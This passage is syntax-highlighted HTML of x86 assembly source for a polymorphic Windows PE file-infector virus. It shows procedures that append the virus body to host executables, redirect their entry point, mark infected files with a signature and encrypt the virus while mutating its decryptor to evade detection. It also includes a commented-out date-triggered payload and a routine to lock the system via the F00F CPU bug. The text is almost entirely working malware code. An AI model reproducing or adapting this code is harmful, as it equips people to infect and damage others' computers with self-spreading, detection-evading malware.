            </span><span class="sc5">dwDeltaOffset</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;Save Delta Offset</span><span class="sc0">

</span><span class="sc1">;Check if the file can be infected, or not</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CanFileBeInfected</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">if_szFileName</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Can it be infected</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_InfectFile</span><span class="sc0">              </span><span class="sc1">;No</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwIncFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">;Save Increase in File Size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwIncSecSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;Save Increase in Section Size</span><span class="sc0">

</span><span class="sc1">;Map Host File into Memory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenAndMapFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">if_szFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwIncFileSize</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;File Opened and Mapped Successfully</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_InfectFile</span><span class="sc0">              </span><span class="sc1">;No, Return Code = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpHostFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;Save staring address of file</span><span class="sc0">

</span><span class="sc1">;Get File Headers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileHeaders</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;This should not fail, since its already...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwIOH</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;...called once in CanFileBeInfected</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">lpdwLastSection</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;Calculate the Starting of Virus Code in File</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">])</span><span class="sc5">.ISH_PointerToRawData</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">])</span><span class="sc5">.ISH_SizeOfRawData</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwVirusBegin</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;RVA of New Entry Point in File</span><span class="sc0">

</span><span class="sc1">;Calculate RVA of New Entry Point</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpdwLastSection</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">])</span><span class="sc5">.ISH_PointerToRawData</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">])</span><span class="sc5">.ISH_VirtualAddress</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwNewEntryRVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;Calculate Bytes of JMP Instruction</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIOH</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">])</span><span class="sc5">.IOH_AddressOfEntryPoint</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwJumpBytes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;Save Bytes</span><span class="sc0">

</span><span class="sc1">;Append the Virus to the host</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">    </span><span class="sc1">;Copy Virus from Here...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;since StartOfVirusCode will vary after infection</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwVirusBegin</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;...to here</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpHostFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;true location to copy to</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;Write New Jump Instruction in File</span><span class="sc0">
    </span><span class="sc1">;Offset in File where operand to JMP instruction is to be put</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwVirusBegin</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;True offset in file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpHostFile</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Correct offset in Memory Mapped File</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwJumpBytes</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Get operand for jmp instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">;Put it in the file</span><span class="sc0">

</span><span class="sc1">;Update the Last Section Header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpdwLastSection</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIncSecSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIncFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.ISH_SizeOfRawData</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.ISH_VirtualSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.ISH_Characteristics</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_READ_WRITE_EXECUTE</span><span class="sc0">

</span><span class="sc1">;Fix VirtualSize (if Required) for files like TRACERT.EXE)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.ISH_SizeOfRawData</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.ISH_VirtualSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">;Virtual Size Wrong</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">VirtualSizeFine</span><span class="sc0">                                     </span><span class="sc1">;No, Fix Not Required</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">])</span><span class="sc5">.ISH_VirtualSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">;Yes, Fix it</span><span class="sc0">

</span><span class="sc5">VirtualSizeFine</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;Update the PE Header (Image Size)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIOH</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Address of Image Optional Header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">])</span><span class="sc5">.IOH_SizeOfImage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;Update the PE Header (Entry RVA)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwNewEntryRVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Get New Entry RVA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">])</span><span class="sc5">.IOH_AddressOfEntryPoint</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;Update the Win32VersionValue field. This is used as a Virus Signature</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">])</span><span class="sc5">.IOH_Win32VersionValue</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUS_SIGNATURE</span><span class="sc0">

</span><span class="sc1">;Encrypt the file, and Close it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpHostFile</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Staring address of Host File</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwVirusBegin</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Address of virus in file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EncryptVirus</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapAndCloseFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">if_szFileName</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;All OK, Return Code 1</span><span class="sc0">

</span><span class="sc5">End_InfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                        EncryptVirus                                    | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Encrypts the Virus Code with a random byte, and mutates the decryptor,</span><span class="sc0">
</span><span class="sc1">;      making the virus Encrypted &amp; Polymorphic</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; EDI: Starting address of Virus in Memory Mapped File</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All except EDI</span><span class="sc0">
</span><span class="sc1">;________________</span><span class="sc0">
</span><span class="sc5">EncryptVirus</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;Save starting address of virus code</span><span class="sc0">

</span><span class="sc1">;Get Encryption Key, to be used for encrypting/decrypting</span><span class="sc0">
    </span><span class="sc1">;@DELTA esi</span><span class="sc0">
    </span><span class="sc1">;call   esi + GetTickCount      ;Get random number in EAX (AL)</span><span class="sc0">

    </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">;Get random encryption key</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;Don't encrypt in Debug Mode</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ENCRYPTED_SIZE</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LOADER_SIZE</span><span class="sc0">        </span><span class="sc1">;Don't enrypt the loader !!</span><span class="sc0">
</span><span class="sc5">EncryptByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">;al = Encryption Key</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">EncryptByte</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;restore starting address of virus code</span><span class="sc0">

</span><span class="sc1">;Update the Encryption Key in the decryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EncryptionKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;Mutate the Decryptor</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MutateDecryptor</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EncryptVirus</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                          StringLength                                  | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; Returns the length of the string</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; DWORD sl_lpszString: Address of the string</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: Length of the string</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX, ECX, EDI</span><span class="sc0">
</span><span class="sc1">;____________________________________</span><span class="sc0">
</span><span class="sc5">StringLength</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">sl_lpszString</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sl_lpszString</span><span class="sc0">          </span><span class="sc1">;string whose length is required</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;ecx = -1, search till infinity</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;search for NULL character</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                   </span><span class="sc1">;Find the terminating NULL</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;length of string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;return length of string</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">StringLength</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               TimerProc</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function is called when the Time-out value for the Timer Expires.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; tp_hwnd: Handle of the window</span><span class="sc0">
</span><span class="sc1">;      tp_uMsg: WM_TIMER</span><span class="sc0">
</span><span class="sc1">;      tp_idEvent: ID of the timer</span><span class="sc0">
</span><span class="sc1">;      tp_dwTimer: Value of GetTickCount()</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;_____________________________________________________________________________</span><span class="sc0">
</span><span class="sc1">;TimerProc PROC tp_hwnd:DWORD, tp_uMsg:DWORD, tp_idEvent:DWORD, tp_dwTime:DWORD</span><span class="sc0">
</span><span class="sc1">;   LOCAL   dwDeltaOffset:DWORD, \
;           dwFileNumber:DWORD, \
;           stTime:SYSTEMTIME</span><span class="sc0">
</span><span class="sc1">;   pushad                                      ;must save, since this is a CALLBACK fn</span><span class="sc0">
</span><span class="sc1">;   @DELTA  esi</span><span class="sc0">
</span><span class="sc1">;   mov     [dwDeltaOffset], esi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Check if Date is 8th December</span><span class="sc0">
</span><span class="sc1">;   lea     eax, stTime</span><span class="sc0">
</span><span class="sc1">;   call    esi + GetLocalTime, eax</span><span class="sc0">
</span><span class="sc1">;   cmp     stTime.ST_wMonth, 12            ;is Month = December</span><span class="sc0">
</span><span class="sc1">;   jne     Not_8_December                  ;No</span><span class="sc0">
</span><span class="sc1">;   cmp     stTime.ST_wDay, 8               ;Yes. Is Day = 8th</span><span class="sc0">
</span><span class="sc1">;   jne     Not_8_December                  ;No</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Deliever Payload since date is 8th December</span><span class="sc0">
</span><span class="sc1">;   call    PayLoad</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Not_8_December:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Lock System if Windows has been running for a long time</span><span class="sc0">
</span><span class="sc1">;   ;cmp    tp_dwTime, MAX_RUN_TIME             ;Is Windows Up-time &gt; 2 hours</span><span class="sc0">
</span><span class="sc1">;   ;jle    NoLockWindows                       ;No</span><span class="sc0">
</span><span class="sc1">;   ;DB     0F0h                                ;Yes, use F00F Bug to hang / lock System</span><span class="sc0">
</span><span class="sc1">;   ;DB     0Fh</span><span class="sc0">
</span><span class="sc1">;   ;DB     0C7h</span><span class="sc0">
</span><span class="sc1">;   ;DB     0C8h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;NoLockWindows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;End_TimerElapsed:</span><span class="sc0">
</span><span class="sc1">;   popad                                       ;restore state</span><span class="sc0">
</span><span class="sc1">;   ret</span><span class="sc0">
</span><span class="sc1">;TimerProc ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                           CanFileBeInfected                            | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function checks if a file can be infected or not. It checks the</span><span class="sc0">
</span><span class="sc1">;      following:</span><span class="sc0">
</span><span class="sc1">;      1. File must be an EXE</span><span class="sc0">
